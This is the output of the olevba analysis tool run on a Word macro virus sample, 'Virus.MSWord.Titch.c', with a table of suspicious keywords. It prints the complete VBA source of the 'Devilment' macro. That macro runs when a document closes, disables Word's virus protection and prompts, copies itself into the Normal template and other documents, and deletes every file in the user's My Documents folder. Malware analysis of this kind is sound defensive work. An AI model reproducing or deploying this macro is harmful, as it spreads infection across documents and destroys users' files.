olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titch.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titch.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Devilment.bas 
in file: ./Virus.MSWord.Titch.c - OLE stream: 'Macros/VBA/Devilment'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro created 09/11/99 by Simon Rolley"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"
'Devilment
'An experiment in Macro programming ;)
'Ha Ha Ha
 On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  Dim x As Integer
  Dim found As Boolean
  found = False
  x = 1
  For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'Devilment" Then found = True
  Next x
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "devilment", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  x = 1
  For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'Devilment" Then found = True
  Next x
  If Not found Then
    NormalTemplate.VBProject.VBComponents("devilment").Export ("c:\devilment.tmp")
    ActiveDocument.VBProject.VBComponents.Import ("c:\devilment.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\mydocu~1\*.*")
    Kill ("c:\devilment.tmp")
  End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

